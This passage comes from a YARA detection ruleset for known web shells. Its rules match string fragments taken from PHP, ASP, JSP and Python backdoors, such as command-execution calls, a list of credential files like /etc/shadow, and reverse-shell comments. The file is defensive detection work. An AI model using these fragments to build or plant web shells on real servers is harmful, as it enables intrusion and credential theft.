		$s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>"

	condition:
		2 of them
}

rule SIGNATURE_BASE_PHP_Shell_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file PHP Shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6978126c-5414-52d2-b085-6e5589716d93"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4552-L4563"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
		logic_hash = "2d5b6e08bfe9e1551dab12b01189dadc924c097427c996684bab96c48d528395"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
		$s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="

	condition:
		all of them
}

rule SIGNATURE_BASE_Ayyildiz_Tim___AYT__Shell_V_2_1_Biz_Html_1
{
	meta:
		description = "Semi-Auto-generated  - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d50a8669-fd28-59d2-9f00-f4fe2b85dc22"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4564-L4577"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8a8c8bb153bd1ee097559041f2e5cf0a"
		logic_hash = "9e2d56b49df65a2c13e15f97ec91cdbb6852d86e86f921d7c8a4db82cbea12f5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Ayyildiz"
		$s1 = "TouCh By iJOo"
		$s2 = "First we check if there has been asked for a working directory"
		$s3 = "http://ayyildiz.org/images/whosonline2.gif"

	condition:
		2 of them
}

rule SIGNATURE_BASE_EFSO_2_Asp_1
{
	meta:
		description = "Semi-Auto-generated  - file EFSO_2.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "f0566790-b41c-5167-b7ec-19e7d04256d1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4578-L4589"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b5fde9682fd63415ae211d53c6bfaa4d"
		logic_hash = "15e5419854bcbb08f28fff1e266cca7a004f01ec0a5c313c107ec17c3aa7ffee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Ejder was HERE"
		$s1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Lamashell_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file lamashell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cbbb3377-ef9c-5fd1-a8b8-2b730fb5ef28"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4590-L4602"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "de9abc2e38420cad729648e93dfc6687"
		logic_hash = "5e156c3057338fa7b306b91dd979851dd56b8b698cfe99e1d7b6d096a4c580e7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "lama's'hell" fullword
		$s1 = "if($_POST['king'] == \"\") {"
		$s2 = "if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['f"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ajax_PHP_Command_Shell_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file Ajax_PHP Command Shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cae2e035-ae7b-589b-b2d9-e709028274c5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4603-L4615"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "93d1a2e13a3368a2472043bd6331afe9"
		logic_hash = "37cba26018f3d37194a143871012a61a7bcee6775d2cf5f93a52b779010d3260"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>"
		$s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help"
		$s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Jspwebshell_1_2_Jsp_1
{
	meta:
		description = "Semi-Auto-generated  - file JspWebshell 1.2.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "edfe6a3d-7d56-52ad-a376-cec5722e87b7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4616-L4629"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "70a0ee2624e5bbe5525ccadc467519f6"
		logic_hash = "32b3ddb00f89a3540118fe8ce5fc070556b00030dcf2b21245d38ae66e6cbc14"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "JspWebshell"
		$s1 = "CreateAndDeleteFolder is error:"
		$s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c"
		$s3 = "String _password =\"111\";"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Sincap_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file Sincap.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8c4dc7b1-94ce-5528-8442-eae05d2c9980"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4630-L4642"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b68b90ff6012a103e57d141ed38a7ee9"
		logic_hash = "e708a7dcb26ff7d0208c1f092e14e701f2ae94c4ffca019f13064bbe04ef74d7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');"
		$s2 = "$tampon4=$tampon3-1"
		$s3 = "@aventgrup.net"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Phyton_Shell_Py_1
{
	meta:
		description = "Semi-Auto-generated  - file Phyton Shell.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "2f55d60d-94f3-508d-a2d0-5ab59e3fdab3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4656-L4669"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "92b3c897090867c65cc169ab037a0f55"
		logic_hash = "ac16a95cd1fb09c93b315e3cd7d57c1ebec322b641f515854fb73a61393dd365"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "sh_out=os.popen(SHELL+\" \"+cmd).readlines()" fullword
		$s2 = "#   d00r.py 0.3a (reverse|bind)-shell in python by fQ" fullword
		$s3 = "print \"error; help: head -n 16 d00r.py\"" fullword
		$s4 = "print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Mysql_Tool_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file mysql_tool.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c67197d1-6e40-5bf2-9e1b-6ada43529435"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4670-L4682"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5fbe4d8edeb2769eda5f4add9bab901e"
		logic_hash = "9f49bd6c56c919f678ecada82ff3d801c82c98a8abdee85cda1ec7e5b6756012"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['"
		$s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV"
		$s4 = "<div align=\"center\">The backup process has now started<br "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Zehir_4_Asp_1
{
	meta:
		description = "Semi-Auto-generated  - file Zehir 4.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ea7df4e1-d4e2-5a58-a014-d12cb9afaf79"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4683-L4694"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7f4e12e159360743ec016273c3b9108c"
		logic_hash = "69063d866daf1709df81fa22d76177bf8d552e19725a94db4a1b2fca79387faf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time="
		$s4 = "<input type=submit value=\"Test Et!\" onclick=\""

	condition:
		1 of them
}

rule SIGNATURE_BASE_Sh_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "da691516-d6c9-5c4b-85c3-f1cd7fc96ae7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4695-L4706"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "330af9337ae51d0bac175ba7076d6299"
		logic_hash = "b0c3307d451e5d7dadece114e2888503a46038e2edb2ff32bf566ce47b300e76"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e"
		$s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Phpbackdoor15_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file phpbackdoor15.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "a93b881b-3050-5f43-803c-4a571aaaef82"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4707-L4719"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0fdb401a49fc2e481e3dfd697078334b"
		logic_hash = "cdd105f36593e8326ca32bf7cf1fba6fb754e7305c91fe6c078323db8f59b23c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na"
		$s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI"
		$s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Phpjackal_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file phpjackal.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ae46cb97-1ff8-50ba-856f-c38fbb1e5163"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4720-L4731"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ab230817bcc99acb9bdc0ec6d264d76f"
		logic_hash = "6e2ff262aecd08e5feaa274a7fd128d75565d6cc03341da7cbeb2949070705e5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s3 = "$dl=$_REQUEST['downloaD'];"
		$s4 = "else shelL(\"perl.exe $name $port\");"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cgi_Python_Py_1
{
	meta:
		description = "Semi-Auto-generated  - file cgi-python.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "75e99d10-3cdf-5f87-9933-4ce5ebe18b09"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4745-L4757"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0a15f473e2232b89dae1075e1afdac97"
		logic_hash = "37c6c7db32a52c8a83ff85f0a50c6fa71e833b9e6d20b1f95e9512fe8bbd0aee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "a CGI by Fuzzyman"
		$s1 = "\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + "
		$s2 = "values = map(lambda x: x.value, theform[field])     # allows for"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ru24_Post_Sh_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file ru24_post_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "78669d3e-629b-591a-a766-923e37d1fdba"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4758-L4770"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5b334d494564393f419af745dc1eeec7"
		logic_hash = "e81e5345bbe07ca85c94a3d8411f0dd3c418689ccae7115c098f718f9093b3bf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>" fullword
		$s3 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
		$s4 = "Writed by DreAmeRz" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Dtool_Pro_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file DTool Pro.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c02c522c-8418-5760-869a-52b41785bebc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4771-L4783"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "366ad973a3f327dfbfb915b0faaea5a6"
		logic_hash = "e8f8b4ca2ab4607e700e897671fd230280763a70897b8ccfc31b3bcb7f2a1f4a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "r3v3ng4ns\\nDigite"
		$s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi"
		$s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Php_Include_W_Shell_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file php-include-w-shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ddcf9031-2ec8-5a86-8326-60e4a699f494"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4799-L4810"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4e913f159e33867be729631a7ca46850"
		logic_hash = "a63910d97b7ef447b2cadb7de12943d3dbb6eada27d3097b8acf58d9b65b6f60"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd"
		$s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Safe0Ver_Shell__Safe_Mod_Bypass_By_Evilc0Der_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file Safe0ver Shell -Safe Mod Bypass By Evilc0der.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "25971f62-33ee-5ed6-8d72-118be5bd2deb"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4811-L4823"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "6163b30600f1e80d2bb5afaa753490b6"
		logic_hash = "46f6bb38f1175e02b03047c06a7aed968b1c1ce2e28cc4b88e15703040e91592"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Safe0ver" fullword
		$s1 = "Script Gecisi Tamamlayamadi!"
		$s2 = "document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Shell_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eaf243cb-fa26-5f34-a724-60a08acff636"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4824-L4836"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1a95f0163b6dea771da1694de13a3d8d"
		logic_hash = "dbd08e71dc512f8dcf009150fb4448cd3608291ef9078c7e6b86e6f8d820bd94"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "/* We have found the parent dir. We must be carefull if the parent " fullword
		$s2 = "$tmpfile = tempnam('/tmp', 'phpshell');"
		$s3 = "if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Telnet_Cgi_1
{
	meta:
		description = "Semi-Auto-generated  - file telnet.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4ca3dace-cd80-58e4-a4de-47dcc64dac0e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4837-L4849"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dee697481383052980c20c48de1598d1"
		logic_hash = "689c1d43c64aa7469989686c60fc9ab46acde42fdf3c1157bae1e2b8373c845f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "W A R N I N G: Private Server"
		$s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie"
		$s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ironshell_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file ironshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "0d63ad03-4d1d-535f-8afe-3edaf1bf4010"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4850-L4864"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8bfa2eeb8a3ff6afc619258e39fded56"
		logic_hash = "23574299ee2bb33c3f71102adf71ac8f09b6f8ece5f798beacb9b2432d297ee7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "www.ironwarez.info"
		$s1 = "$cookiename = \"wieeeee\";"
		$s2 = "~ Shell I"
		$s3 = "www.rootshell-team.info"
		$s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Backdoorfr_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file backdoorfr.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "5ba2b617-a873-5e80-9cfc-c61cc8d605f3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4865-L4876"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "91e4afc7444ed258640e85bcaf0fecfc"
		logic_hash = "40a6fb41a65fd35acb7cdc36fdda90f5dc54b641adc3ba9eaae29c5e46622206"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan"
		$s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cmdjsp_Jsp_1
{
	meta:
		description = "Semi-Auto-generated  - file cmdjsp.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "048478a8-9622-54c7-80ed-e4e223d14500"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4891-L4904"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b815611cc39f17f05a73444d699341d4"
		logic_hash = "8b0e425c7d71ea2c536192ff186665e7f0fbdbc0e0d195d7107ac57cf9bd1773"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword
		$s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
		$s2 = "cmdjsp.jsp"
		$s3 = "michaeldaw.org" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_H4Ntu_Shell__Powered_By_Tsoi__1
{
	meta:
		description = "Semi-Auto-generated  - file h4ntu shell [powered by tsoi].txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "186358e6-88a3-5fad-b1ba-a49b2a5dea1c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4905-L4916"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "06ed0b2398f8096f1bebf092d0526137"
		logic_hash = "32c620a4ed3f7a8640928e2211516978c12cfbdedb7d96e923303740407b5a1c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "h4ntu shell"
		$s1 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ajan_Asp_1
{
	meta:
		description = "Semi-Auto-generated  - file Ajan.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6040fd88-b992-5110-8b37-7711ace30b1a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4917-L4929"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b6f468252407efc2318639da22b08af0"
		logic_hash = "13988af864a62ca04501288d4f2d830815ab453b14cef6795fe993db1dd1a9ef"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "c:\\downloaded.zip"
		$s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword
		$s3 = "http://www35.websamba.com/cybervurgun/"

	condition:
		1 of them
}

rule SIGNATURE_BASE_PHANTASMA_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file PHANTASMA.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "21ff4cee-9cdc-57d1-9c43-e033fdb47de0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4930-L4943"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "52779a27fa377ae404761a7ce76a5da7"
		logic_hash = "d4a2a1bcc1ff3264b35f2b05d7de664b56807977f2a793fd87206f046a185d3b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ">[*] Safemode Mode Run</DIV>"
		$s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>"
		$s2 = "[*] Spawning Shell"
		$s3 = "Cha0s"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Mysql_Web_Interface_Version_0_8_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file MySQL Web Interface Version 0.8.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "90616d2d-082b-5983-a859-62d1c5b8066e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4944-L4957"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "36d4f34d0a22080f47bb1cb94107c60f"
		logic_hash = "f0a20870a3240948e3ef1ad61685b00c5fc90d6098b87af9ac43ab44ccd13c9e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SooMin Kim"
		$s1 = "http://popeye.snu.ac.kr/~smkim/mysql"
		$s2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename"
		$s3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Simple_Cmd_Html_1
{
	meta:
		description = "Semi-Auto-generated  - file simple_cmd.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "30990574-02a0-5eed-8317-847b6be13300"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4958-L4971"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
